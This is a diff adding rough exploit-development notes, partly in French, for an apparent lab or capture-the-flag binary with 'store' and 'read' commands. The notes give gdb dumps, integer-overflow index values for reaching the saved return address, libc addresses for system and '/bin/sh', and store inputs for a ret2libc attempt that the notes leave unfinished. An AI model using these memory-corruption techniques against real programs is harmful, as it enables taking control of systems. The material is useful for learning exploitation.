@@ -1,0 +1,90 @@
+Input command: store
+ Number: 3
+ Index: 47972351
+Segmentation fault (core dumped)
+
+==================================
+
+Input command: read
+ Index: 15555
+Segmentation fault (core dumped)
+
+==================================
+
+try to find the stack argument arg_8h with gdb
+number: 17
+index: 1
+(gdb) x /16x 0xffffd554
+0xffffd554:     0x00000000      0x00000011      0x00000000      0x00000000
+0xffffd564:     0x00000028      0x00000000      0x00000000      0x00000000
+0xffffd574:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd584:     0x00000000      0x00000000      0x00000000      0x00000000
+
+so arg_8h is at 0xffffd554
+eip at 0xffffd52c so 0xffffd554 - 0xffffd52c = 40
+try to replace eip : number : 257, index : 1073741814 ou -10 (nb * 4 = -40 (eip address : (ebp - 40)))
+
+=> impossible, protection from it
+
+==================================
+x = nb * 4 + arg_8h
+
+nb = (x - arg_8h) / 4
+
+arg_8h address : 0xffffd554
+printf jmp address : 0x804a000
+(0x804a000 - 0xffffd554) / 4
+
+=> On peux reecrire sur la table de function !
+
+comment introduire notre shellcode?
+
+================================ VAR ENV
+=> le programme efface les var d'environnement
+impossible
+
+=============================== REMPLACER EIP PAR SYSTEM =================================================
+
+we can access eip with : -1073741834 (*= 4 => -40)
+
+system is at : 0xf7e6aed0 => 4159090384
+
+
+libc-2.15.so : 0xf7e2c000
+15d7ec /bin/sh
+=> /bin/sh is at 0xf7e2c000 + 0x15d7ec = 0xf7f897ec => 4160264172
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:      "/bin/sh"
+
+
+we will store it at eip - 8 => arg_8h -48
+if we put index = -12 we can store it
+
+=> we can't do that exactly, we need to store it in arg8_h
+
+=========================== PUT SYSTEM IN ARG8_H =================================================================
+
+index at 0 with -2147483648
+ Input command: store
+ Number: 4159090384 #system
+ Index: -2147483648 #0
+ Completed store command successfully
+
+index at 8 with 2
+ Input command: store
+ Number: 4160264172
+ Index: 2
+ Completed store command successfully
+
+index at -40 with -1073741834 (eip)
+arg_8h : 0xffffd414 => 4294956052
+Input command: store
+ Number: 4294956052
+ Index:  -1073741834
+ Segfault
+
+ =================== PUT SYSTEM IN READ_NUMBER ===========================================
+
+address read_number : 0x080486d7
+
+nb = (0x080486d7 - 0xffffd414)
